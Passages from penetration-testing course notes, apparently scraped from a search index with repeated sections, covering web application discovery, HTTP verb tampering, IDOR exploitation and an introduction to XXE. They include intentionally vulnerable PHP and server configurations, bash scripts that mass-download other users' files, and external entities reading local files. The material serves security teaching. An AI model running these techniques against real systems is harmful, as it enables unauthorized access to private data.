Typically, when we connect to a network, we'll start with a ping sweep to identify \"live hosts.\" From there, we will usually begin targeted port scanning and, eventually, deeper port scanning to identify running services. In a network with hundreds or thousands of hosts, this enumeration data can become unwieldy. Let's say we perform an Nmap port scan to identify common web services such as: hrmns@htb[/htb]$ nmap -p 80 ,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient. Lucky for us, several great tools exist that can greatly assist in this process. Two phenomenal tools that every tester should have in their arsenal are EyeWitness and Aquatone . Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each. The screenshots are then assembled into a report that we can work through in the web browser to assess the web attack surface. These screenshots can help us narrow down potentially 100s of hosts and build a more targeted list of applications that we should spend more time enumerating and attacking. An example structure may look like the following for the discovery phase: External Penetration Test - <Client Name> Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy) Client Points of Contact Credentials Discovery/Enumeration Scans Live hosts Application Discovery Scans Interesting/Notable Hosts Exploitation <Hostname or IP> <Hostname or IP> Post-Exploitation <Hostname or IP> <Hostname or IP> Initial Enumeration \u00b6 Assume our client provided us with the following scope: hrmns@htb[/htb]$ cat scope_list app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog-dev.inlanefreight.local blog.inlanefreight.local app-dev.inlanefreight.local jenkins-dev.inlanefreight.local jenkins.inlanefreight.local web01.inlanefreight.local gitlab-dev.inlanefreight.local gitlab.inlanefreight.local support-dev.inlanefreight.local support.inlanefreight.local inlanefreight.local 10.129.201.50 I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope.

Typically, when we connect to a network, we'll start with a ping sweep to identify \"live hosts.\" From there, we will usually begin targeted port scanning and, eventually, deeper port scanning to identify running services. In a network with hundreds or thousands of hosts, this enumeration data can become unwieldy. Let's say we perform an Nmap port scan to identify common web services such as: hrmns@htb[/htb]$ nmap -p 80 ,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient. Lucky for us, several great tools exist that can greatly assist in this process. Two phenomenal tools that every tester should have in their arsenal are EyeWitness and Aquatone . Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each. The screenshots are then assembled into a report that we can work through in the web browser to assess the web attack surface. These screenshots can help us narrow down potentially 100s of hosts and build a more targeted list of applications that we should spend more time enumerating and attacking. An example structure may look like the following for the discovery phase: External Penetration Test - <Client Name> Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy) Client Points of Contact Credentials Discovery/Enumeration Scans Live hosts Application Discovery Scans Interesting/Notable Hosts Exploitation <Hostname or IP> <Hostname or IP> Post-Exploitation <Hostname or IP> <Hostname or IP>","title":"Application Discovery and Enumeration"},{"location":"attacking_common_apps/setting_the_stage/#initial-enumeration","text":"Assume our client provided us with the following scope: hrmns@htb[/htb]$ cat scope_list app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog-dev.inlanefreight.local blog.inlanefreight.local app-dev.inlanefreight.local jenkins-dev.inlanefreight.local jenkins.inlanefreight.local web01.inlanefreight.local gitlab-dev.inlanefreight.local gitlab.inlanefreight.local support-dev.inlanefreight.local support.inlanefreight.local inlanefreight.local 10.129.201.50 I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan.

Other than GET and POST, the following are some of the commonly used HTTP verbs: Verb Description HEAD Identical to a GET request, but its response only contains the headers , without the response body PUT Writes the request payload to the specified location DELETE Deletes the resource at the specified location OPTIONS Shows different options accepted by a web server, like accepted HTTP verbs PATCH Apply partial modifications to the resource at the specified location What makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability. Insecure Configurations \u00b6 Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. <Limit GET POST > Require valid-user </Limit> Even though the configuration specifies both GET and POST requests for the authentication method, an attacker may still use a different HTTP method (like HEAD ) to bypass this authentication mechanism altogether. Insecure Coding \u00b6 This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters: $pattern = \"/^[A-Za-z\\s]+$/\"; if(preg_match($pattern, $_GET[\"code\"])) { $query = \"Select * from ports where port_code like '%\" . $_REQUEST[\"code\"] . \"%'\"; ...SNIP... } We can see that the sanitization filter is only being tested on the GET parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the $_REQUEST[\"code\"] parameters are being used, which may also contain POST parameters, leading to an inconsistency in the use of HTTP Verbs . In this case, an attacker may use a POST request to perform SQL injection, in which case the GET parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection. Bypassing Basic Authentication \u00b6 We have a basic File Manager web application, in which we can add new files by typing their names and hitting enter: Suppose we try to delete all files by clicking on the red Reset button. In that case, we see that this functionality seems to be restricted for authenticated users only, as we get the following HTTP Basic Auth prompt: As we do not have any credentials, we will get a 401 Unauthorized page: Let's see whether we can bypass this with an HTTP Verb Tampering attack. To do so, we need to identify which pages are restricted by this authentication. If we examine the HTTP request after clicking the Reset button or look at the URL that the button navigates to after clicking it, we see that it is at /admin/reset.php . So, either the /admin directory is restricted to authenticated users only, or only the /admin/reset.php page is. We can confirm this by visiting the /admin directory, and we do indeed get prompted to log in again. This means that the full /admin directory is restricted. Exploit \u00b6 We need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it: As the page uses a GET request, we can send a POST request and see whether the web page allows POST requests (i.e., whether the Authentication covers POST requests). we can click Forward and examine the page in our browser. Unfortunately, we still get prompted to log in and will get a 401 Unauthorized page if we don't provide the credentials: Seems like the web server configurations do cover both GET and POST requests. To see whether the server accepts HEAD requests, we can send an OPTIONS request to it and see what HTTP methods are accepted, as follows: hrmns@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/ HTTP/1.1 200 OK Date: Server: Apache/2.4.41 (Ubuntu) Allow: POST,OPTIONS,HEAD,GET Content-Length: 0 Content-Type: httpd/unix-directory the response shows Allow: POST,OPTIONS,HEAD,GET , which means that the web server indeed accepts HEAD requests, which is the default configuration for many web servers. Try to intercept the reset request again, and this time use a HEAD request to see how the web server handles it: Once we change POST to HEAD and forward the request, we will see that we no longer get a login prompt or a 401 Unauthorized page and get an empty output instead, as expected with a HEAD request. If we go back to the File Manager web application, we will see that all files have indeed been deleted, we successfully triggered the Reset functionality without having admin access or any credentials: Bypassing Security Filters \u00b6 The other and more common type of HTTP Verb Tampering vulnerability is caused by Insecure Coding errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g. $_POST['parameter'] ), it may be possible to bypass it by simply changing the request method to GET . Identify \u00b6 if we try to crate a new file name with special characters in its name (e.g. test; ), we get the following message: This message shows that the web application uses certain filters on the back-end to identify injection attempts and then blocks any malicious requests. Exploit \u00b6 To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use Change Request Method to change it to another method: We did not get the Malicious Request Denied! message, and our file was successfully created: To confirm, we need to attempt exploiting the vuln the filter is protecting: Command Injection Vulnerability, in this case. Again change the request method to a GET request: Both file1 and file2 were created: Successfully bypassed the filter through an HTTP Verb Tampering vulnerability and achieved command injection. Verb Tampering Prevention \u00b6 Insecure configurations and insecure coding are what usually introduce Verb Tampering vulnerabilities. Insecure Configuration \u00b6 HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including Apache , Tomcat , and ASP.NET . The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected. Example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. 000-default.conf ), or in a .htaccess web page configuration file: <Directory \"/var/www/html/admin\" > AuthType Basic AuthName \"Admin Panel\" AuthUserFile /etc/apache2/.htpasswd <Limit GET > Require valid-user </Limit> </Directory> This configuration is setting the authorization configurations for the admin web directory. However, as the <Limit GET> keyword is being used, the Require valid-user setting will only apply to GET requests, leaving the page accessible through POST requests. Same vulnerability for a Tomcat web server, can be found in web.xml file for a certain Java web application: <security-constraint> <web-resource-collection> <url-pattern> /admin/* </url-pattern> <http-method> GET </http-method> </web-resource-collection> <auth-constraint> <role-name> admin </role-name> </auth-constraint> </security-constraint> Authorization is being limited only to the GET method with http-method , which leaves the page accessible through other HTTP methods. Example ASP.NET configuration found in web.config file of a web application: <system.web> <authorization> <allow verbs= \"GET\" roles= \"admin\" > <deny verbs= \"GET\" users= \"*\" > </deny> </allow> </authorization> </system.web> Allow and Deny scope is limited to the GET method, which leaves the web application accessible through other HTTP methods. Above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. We should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods. To avoid similar attacks, generally consider disabling/denying all HEAD requests unless specifically required by the web application. Insecure Coding \u00b6 Consider the following PHP code from our File Manager: if (isset($_REQUEST['filename'])) { if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) { system(\"touch \" . $_REQUEST['filename']); } else { echo \"Malicious Request Denied!\"; } } The fatal error made in this case is not due to Command Injections but due to the inconsistent use of HTTP methods. The preg_match filter only checks for special characters in POST parameters with $_POST['filename'] . However, the final system command uses the $_REQUEST['filename'] variable, which covers both GET and POST parameters. So, in the previous section, when we were sending our malicious input through a GET request, it did not get stopped by the preg_match function, as the POST parameters were empty and hence did not contain and special characters. Once we reach the system function, however, it used any parameters found in the request, and our GET parameters were used in the command, eventually leading to Command Injection. To avoid HTTP Verb Tampering vulnerabilities in our code, we must be consistent with our use of HTTP methods and ensure that the same method is always used for any specific functionality across the web application. It is always advised to expand the scope of testing in security filters by testing all request parameters. This can be done with the following functions and variables: Language Function PHP $_REQUEST['param'] Java request.getParameter('param') C# Request['param']","title":"HTTP Verb Tampering"},{"location":"attacking_web_applications/http_verb_tampering/#http-verb-tampering","text":"HTTP has 9 different verbs that can be accepted as HTTP methods by web servers.

The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected. Example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. 000-default.conf ), or in a .htaccess web page configuration file: <Directory \"/var/www/html/admin\" > AuthType Basic AuthName \"Admin Panel\" AuthUserFile /etc/apache2/.htpasswd <Limit GET > Require valid-user </Limit> </Directory> This configuration is setting the authorization configurations for the admin web directory. However, as the <Limit GET> keyword is being used, the Require valid-user setting will only apply to GET requests, leaving the page accessible through POST requests. Same vulnerability for a Tomcat web server, can be found in web.xml file for a certain Java web application: <security-constraint> <web-resource-collection> <url-pattern> /admin/* </url-pattern> <http-method> GET </http-method> </web-resource-collection> <auth-constraint> <role-name> admin </role-name> </auth-constraint> </security-constraint> Authorization is being limited only to the GET method with http-method , which leaves the page accessible through other HTTP methods. Example ASP.NET configuration found in web.config file of a web application: <system.web> <authorization> <allow verbs= \"GET\" roles= \"admin\" > <deny verbs= \"GET\" users= \"*\" > </deny> </allow> </authorization> </system.web> Allow and Deny scope is limited to the GET method, which leaves the web application accessible through other HTTP methods. Above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. We should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods. To avoid similar attacks, generally consider disabling/denying all HEAD requests unless specifically required by the web application.","title":"Insecure Configuration"},{"location":"attacking_web_applications/http_verb_tampering/#insecure-coding_1","text":"Consider the following PHP code from our File Manager: if (isset($_REQUEST['filename'])) { if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) { system(\"touch \" . $_REQUEST['filename']); } else { echo \"Malicious Request Denied!\"; } } The fatal error made in this case is not due to Command Injections but due to the inconsistent use of HTTP methods. The preg_match filter only checks for special characters in POST parameters with $_POST['filename'] . However, the final system command uses the $_REQUEST['filename'] variable, which covers both GET and POST parameters. So, in the previous section, when we were sending our malicious input through a GET request, it did not get stopped by the preg_match function, as the POST parameters were empty and hence did not contain and special characters. Once we reach the system function, however, it used any parameters found in the request, and our GET parameters were used in the command, eventually leading to Command Injection. To avoid HTTP Verb Tampering vulnerabilities in our code, we must be consistent with our use of HTTP methods and ensure that the same method is always used for any specific functionality across the web application.

If users request access to a file they recently uploaded, they may get a link to it such as ( download.php?file_id=123 ). So, as the link directly references the file with ( file_id=123 ), what would happen if we tried to access another file (which may not belong to us) with ( download.php?file_id=124 )? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its file_id . In many cases, we may find that the id is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions. The main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access control on the back-end . Impact of IDOR Vulnerabilities \u00b6 IDOR vulnerabilities can have a significant impact on web applications. IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with IDOR Insecure Function Calls . Many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. If we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application. Identifying IDORs \u00b6 URL Parameters & APIs \u00b6 First step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ? uid=1 or ?filename=file_1.pdf ). AJAX Calls \u00b6 May also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role. Basic example of an AJAX call: function changeUserPassword () { $ . ajax ({ url : \"change_password.php\" , type : \"post\" , dataType : \"json\" , data : { uid : user . uid , password : user . password , is_admin : is_admin }, success : function ( result ){ // } }); } The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR Understanding Hashing/Encoding \u00b6 Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If there is no access control system on the back-end, we may still be able to exploit them. See a reference like ( ?filename=ZmlsZV8xMjMucGRm ), we can immediately guess that the file name is base64 encoded (from its character set), which we can decode to get the original object reference of ( file_123.pdf ). Then, we can try encoding a different object reference (e.g. file_124.pdf ) and try accessing it with the encoded object reference ( ?filename=ZmlsZV8xMjQucGRm ), which may reveal an IDOR vulnerability if we were able to retrieve any data. The object reference may be hashed, like ( download.php?filename=c81e728d9d4c2f636f067f89cc14862c ). Looking at the source code, we may see what is being hashed before the API call is made: $ . ajax ({ url : \"download.php\" , type : \"post\" , dataType : \"json\" , data : { filename : CryptoJS . MD5 ( 'file_1.pdf' ). toString ()}, success : function ( result ){ // } }); Mass IDOR Enumeration \u00b6 As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques. We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following: < li class = 'pure-tree_link' >< a href = '/documents/Invoice_3_06_2020.pdf' target = '_blank' > Invoice </ a ></ li > < li class = 'pure-tree_link' >< a href = '/documents/Report_3_01_2020.pdf' target = '_blank' > Report </ a ></ li > We see that each link starts with <li class='pure-tree_link'> , so we may curl the page and grep for this line: hrmns@htb[/htb]$ curl -s \"http://SERVER_IP:PORT/documents.php?uid=1\" | grep \"<li class='pure-tree_link'>\" <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li> <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li> We were able to capture the document links successfully. Use a Regex pattern that matches strings between /document and .pdf, which we can use with grep to only get the document links: hrmns@htb[/htb]$ curl -s \"http://SERVER_IP:PORT/documents.php?uid=3\" | grep -oP \"\\/documents.*?.pdf\" /documents/Invoice_3_06_2020.pdf /documents/Report_3_01_2020.pdf Use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link: #!/bin/bash url = \"http://SERVER_IP:PORT\" for i in { 1 ..10 } ; do for link in $( curl -s \" $url /documents.php?uid= $i \" | grep -oP \"\\/documents.*?.pdf\" ) ; do wget -q $url / $link done done Script will download all documents from all employees with uids between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees. Bypassing Encoded References \u00b6 Intercepted downloading request: sending a POST request to download.php with the following data: contract=cdd96d3cc73d1dbdaffa03cc6cd7339b We can attempt to hash various values, like uid, username, filename, and many others, and see if any of their md5 hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. Compare the md5 hash of our uid, and see if it matches the above hash: hrmns@htb[/htb]$ echo -n 1 | md5sum c4ca4238a0b923820dcc509a6f75849b - Function Disclosure \u00b6 As most modern web applications are developed using JavaScript frameworks, like Angular , React , or Vue.js , many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. Looking at the downloadContract() function in the source code, we see the following: function downloadContract ( uid ) { $ . redirect ( \"/download.php\" , { contract : CryptoJS . MD5 ( btoa ( uid )). toString (), }, \"POST\" , \"_self\" ); } Function appears to be sending a POST request with the contract parameter, which is what we saw above. The value it is sending is an md5 hash using the CryptoJS library. In this case, the value being hashed is btoa(uid) , which is the base64 encoded string of the uid variable, which is an input argument for the function. We can test this by base64 encoding our uid=1 , and then hashing it with md5 , as follows: hrmns@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum cdd96d3cc73d1dbdaffa03cc6cd7339b - We are using the -n flag with echo , and the -w 0 flag with base64 , to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash. This hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. We can begin enumerating other employees' contracts using the same hashing method we used above. Mass Enumeration \u00b6 Simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. hrmns@htb[/htb]$ for i in { 1 ..10 } ; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -' ; done cdd96d3cc73d1dbdaffa03cc6cd7339b 0b7e7dee87b1c3b98e72131173dfbbbf 0b24df25fe628797b3a50ae0724d2730 f7947d50da7a043693a592b4db43b0a1 8b9af1f7f76daf0f02bd9c48c4a2e3d0 006d1236aee3f92b8322299796ba1989 b523ff8d1ced96cef9c86492e790c2fb d477819d240e7d3dd9499ed8d23e7158 3e57e65a34ffcb2e93cb545d024f5bde 5d4aace023dc088767b4e08c79415dcd Next, make a POST request on download.php with each of the above hashes as the contract value, which should give us our final script: #!/bin/bash for i in { 1 ..10 } ; do for hash in $( echo -n $i | base64 -w 0 | md5sum | tr -d ' -' ) ; do curl -sOJ -X POST -d \"contract= $hash \" http://SERVER_IP:PORT/download.php done done With that, we can run the script, and it should download all contracts for employees 1-10: hrmns@htb[/htb]$ bash ./exploit.sh hrmns@htb[/htb]$ ls -1 contract_006d1236aee3f92b8322299796ba1989.pdf contract_0b24df25fe628797b3a50ae0724d2730.pdf contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf contract_5d4aace023dc088767b4e08c79415dcd.pdf contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf contract_b523ff8d1ced96cef9c86492e790c2fb.pdf contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf contract_d477819d240e7d3dd9499ed8d23e7158.pdf contract_f7947d50da7a043693a592b4db43b0a1.pdf IDOR in insecure APIs \u00b6 IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users. While IDOR Information Disclosure Vulnerabilities allow us to read various types of resources, IDOR Insecure Function Calls enable us to call APIs or execute functions as another user. Identifying Insecure APIs \u00b6 We can start testing the Edit Profile page for IDOR vulnerabilities: Click on the Edit Profile button, we are taken to a page to edit information of our user profile, namely Full Name , Email , and About Me : Change any of the details in our profile and click Update profile , and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Intercept the Update request in Burp and look at it: The page is sending a PUT request to the /profile/api.php/profile/1 API endpoint. PUT requests are usually used in APIs to update item details, while POST is used to create new items, DELETE to delete items, and GET to retrieve item details. So, a PUT request for the Update profile function is expected. The interesting bit is the JSON parameters it is sending: { \"uid\" : 1 , \"uuid\" : \"40f5888b67c748df7efba008e7c2f9d2\" , \"role\" : \"employee\" , \"full_name\" : \"Amy Lindon\" , \"email\" : \"a_lindon@employees.htb\" , \"about\" : \"A Release is like a boat. 80% of the holes plugged is not good enough.\" } The PUT request includes a few hidden parameters, like uid, uuid , and most interestingly role , which is set to employee . The web application also appears to be setting the user access privileges (e.g. role ) on the client-side, in the form of our Cookie: role=employee cookie, which appears to reflect the role specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges. Unless the web application has a solid access control system on the back-end, we should be able to set an arbitrary role for our user, which may grant us more privileges . Exploiting Insecure APIs \u00b6 Start by changing our uid to another user's uid (e.g. \" uid \": 2 ). However, any number we set other than our own uid gets us a response of uid mismatch : The web application appears to be comparing the request's uid to the API endpoint ( /1 ). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors. We'll change the API endpoint to /profile/api.php/profile/2 , and change \"uid\": 2 to avoid the previous uid mismatch : This time, we get an error message saying uuid mismatch . Application appears to be checking if the uuid value we are sending matches the user's uuid . Since we are sending our own uuid , our request is failing. This appears to be another form of access control to prevent users from changing another user's details. Let's see if we can create a new user with a POST request to the API endpoint. We can change the request method to POST , change the uid to a new uid , and send the request to the API endpoint of the new uid : Error: Creating new employees is for admins only . The same thing happens when we send a Delete request. The web application might be checking our authorization through the role=employee cookie because this appears to be the only form of authorization in the HTTP request. Finally, try changing role to admin/administrator to gain higher privileges. Unfortunately, without knowing a valid role name, we get Invalid role in the HTTP response, and our role does not update: So, is the web application secure against IDOR attacks? So far, we have only been testing the IDOR Insecure Function Calls . We have not tested the API's GET request for IDOR Information Disclosure Vulnerabilities . Information Disclosure \u00b6 Send a GET request with another uid : This returned the details of another user, with their own uuid and role , confirming an IDOR Information Disclosure vulnerability : { \"uid\" : \"2\" , \"uuid\" : \"4a9bd19b3b8676199592a346051f950c\" , \"role\" : \"employee\" , \"full_name\" : \"Iona Franklyn\" , \"email\" : \"i_franklyn@employees.htb\" , \"about\" : \"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it.\" } This provides new details, most notably the uuid . Modifying Other User's Details \u00b6 With the user's uuid at hand, we can change this user's details by sending a PUT request to /profile/api.php/profile/2 No error this time, GET user details we see it's indeed updated: ) The ability to modify another user's details also enables us to perform several other attacks. E.g. modifying a user's email address and then requesting a password reset link, which will be sent to the email address we specified, allowing us to take control over their account. Another potential attack is placing an XSS payload in the 'about' field , which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways. Chaining Two IDOR Vulnerabilities \u00b6 Look for other roles , ideally an admin role. { \"uid\" : \"X\" , \"uuid\" : \"a36fa9e66e85f2dd6f5e13cad45248ae\" , \"role\" : \"web_admin\" , \"full_name\" : \"administrator\" , \"email\" : \"webadmin@employees.htb\" , \"about\" : \"HTB{FLAG}\" } The admin role name ( web_admin ), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the Update profile button and change our role to web_admin : We do not get the Invalid role error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we GET our user details, we see that our role has indeed been set to web_admin : { \"uid\" : \"1\" , \"uuid\" : \"40f5888b67c748df7efba008e7c2f9d2\" , \"role\" : \"web_admin\" , \"full_name\" : \"Amy Lindon\" , \"email\" : \"a_lindon@employees.htb\" , \"about\" : \"A Release is like a boat. 80% of the holes plugged is not good enough.\" } Refresh the page to update our cookie, or manually set it as Cookie: role=web_admin , and then intercept the Update request to create a new user and see if we'd be allowed to do so: No error message. If we send a GET request for the new user, we see that it has been successfully created: By combining the information we gained from the IDOR Information Disclosure vulnerability with an IDOR Insecure Function Calls attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.","title":"Insecure Direct Object References"},{"location":"attacking_web_applications/idor/#insecure-direct-object-references-idor","text":"IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects.

We can test this by base64 encoding our uid=1 , and then hashing it with md5 , as follows: hrmns@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum cdd96d3cc73d1dbdaffa03cc6cd7339b - We are using the -n flag with echo , and the -w 0 flag with base64 , to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash. This hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's.

XML \u00b6 Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. Basic example of an XML document representing an e-mail document structure: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <email> <date> 01-01-2022 </date> <time> 10:00 am UTC </time> <sender> john@inlanefreight.com </sender> <recipients> <to> HR@inlanefreight.com </to> <cc> <to> billing@inlanefreight.com </to> <to> payslips@inlanefreight.com </to> </cc> </recipients> <body> Hello, Kindly share with me the invoice for the payment made on January 1, 2022. Regards, John </body> </email> Key Definition Example Tag The keys of an XML document, usually wrapped with ( < / > ) characters. <date> Entity XML variables, usually wrapped with ( & / ; ) characters. &lt; Element The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. <date>01-01-2022</date> Attribute Optional specifications for any element that are stored in the tags, which may be used by the XML parser. version=\"1.0\" / encoding=\"UTF-8\" Declaration Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. <?xml version=\"1.0\" encoding=\"UTF-8\"?> Some characters are used as part of an XML document structure, like < , > , & , or \" . So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. &lt; , &gt; , &amp; , &quot; ). XML DTD \u00b6 XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. <!DOCTYPE email [ <!ELEMENT email (date, time, sender, recipients, body)> <!ELEMENT recipients (to, cc?)> <!ELEMENT cc (to*)> <!ELEMENT date (#PCDATA)> <!ELEMENT time (#PCDATA)> <!ELEMENT sender (#PCDATA)> <!ELEMENT to (#PCDATA)> <!ELEMENT body (#PCDATA)> ]> DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA ). Above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd) , and then referenced within the XML document with the SYSTEM keyword <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email SYSTEM \"email.dtd\"> Reference DTD through a URL: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email SYSTEM \"http://inlanefreight.com/email.dtd\"> XML Entities \u00b6 Define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY company \"Inlane Freight\"> ]> Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company; ). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY company SYSTEM \"http://localhost/company.txt\"> <!ENTITY signature SYSTEM \"file:///var/www/html/signature.txt\"> ]> Local File Disclosure \u00b6 If we fill the contact form and click on Send Data , then intercept the HTTP request with Burp, we get the following request: If we send the form without any modification, we get the following message: We see that the value of the email element is being displayed back to us on the page. To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into . we know that whatever value we place in the <email></email> element gets displayed in the HTTP response. Define a new entity and then use it as a variable in the email element to see whether it gets replaced with the value we defined. <!DOCTYPE email [ <!ENTITY company \"Inlane Freight\"> ]> We should have a new XML entity called company , which we can reference with &company ;. So, instead of using our email in the email element, let us try using &company ;, and see whether it will be replaced with the value we defined ( Inlane Freight ): The response did use the value of the entity we defined ( Inlane Freight ) 